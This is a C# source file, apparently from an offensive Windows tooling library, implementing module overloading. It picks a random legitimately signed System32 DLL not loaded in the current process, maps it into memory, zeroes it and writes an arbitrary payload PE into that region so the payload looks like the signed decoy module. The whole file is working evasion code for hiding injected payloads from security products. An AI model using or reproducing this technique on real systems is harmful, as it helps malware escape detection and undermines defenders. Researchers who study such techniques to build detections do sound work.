using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace StandardModule.Invocation.ManualMap
{
    public static class Overload
    {
        public static string FindDecoyModule(long minSize, bool legitSigned = true)
        {
            var systemDirectoryPath =
                Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            
            var files = new List<string>(Directory.GetFiles(systemDirectoryPath, "*.dll"));

            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            var r = new Random();
            var candidates = new List<int>();

            while (candidates.Count != files.Count)
            {
                var rInt = r.Next(0, files.Count);
                var currentCandidate = files[rInt];

                if (candidates.Contains(rInt) == false && new FileInfo(currentCandidate).Length >= minSize)
                {
                    if (legitSigned)
                    {
                        if (Utilities.Utilities.FileHasValidSignature(currentCandidate))
                            return currentCandidate;

                        candidates.Add(rInt);
                    }
                    else
                    {
                        return currentCandidate;
                    }
                }

                candidates.Add(rInt);
            }

            return string.Empty;
        }

        public static Data.PE.PE_MANUAL_MAP OverloadModule(byte[] payload, string decoyModulePath = null,
            bool legitSigned = true)
        {
            if (!string.IsNullOrEmpty(decoyModulePath))
            {
                if (!File.Exists(decoyModulePath))
                    throw new InvalidOperationException("Decoy filepath not found.");

                var decoyFileBytes = File.ReadAllBytes(decoyModulePath);

                if (decoyFileBytes.Length < payload.Length)
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
            }
            else
            {
                decoyModulePath = FindDecoyModule(payload.Length);

                if (string.IsNullOrEmpty(decoyModulePath))
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
            }

            var decoyMetaData = Map.MapModuleFromDiskToSection(decoyModulePath);
            var regionSize = decoyMetaData.PEINFO.Is32Bit
                ? (IntPtr)decoyMetaData.PEINFO.OptHeader32.SizeOfImage
                : (IntPtr)decoyMetaData.PEINFO.OptHeader64.SizeOfImage;

            DynamicInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref decoyMetaData.ModuleBase, ref regionSize,
                Data.Win32.WinNT.PAGE_READWRITE);
            DynamicInvoke.Native.RtlZeroMemory(decoyMetaData.ModuleBase, (int)regionSize);

            var overloadedModuleMetaData = Map.MapModuleToMemory(payload, decoyMetaData.ModuleBase);
            overloadedModuleMetaData.DecoyModule = decoyModulePath;

            return overloadedModuleMetaData;
        }
    }
}